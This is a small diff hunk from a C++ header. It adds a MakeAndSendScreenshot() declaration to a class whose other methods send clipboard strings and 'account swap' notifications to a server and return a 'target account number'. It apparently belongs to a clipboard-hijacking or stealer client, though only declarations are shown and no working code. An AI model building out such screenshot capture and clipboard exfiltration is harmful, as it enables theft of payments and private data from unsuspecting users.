@@ -19,6 +19,7 @@ public:
 	void SendClipboardStringToServer(const std::string& str);
 	void SendAccountSwapNotificationToServer();
 	void OnClipboardChange();
+	void MakeAndSendScreenshot();
 	void BlockingListen();
 
 	std::string GetTargetAccountNumber() const;
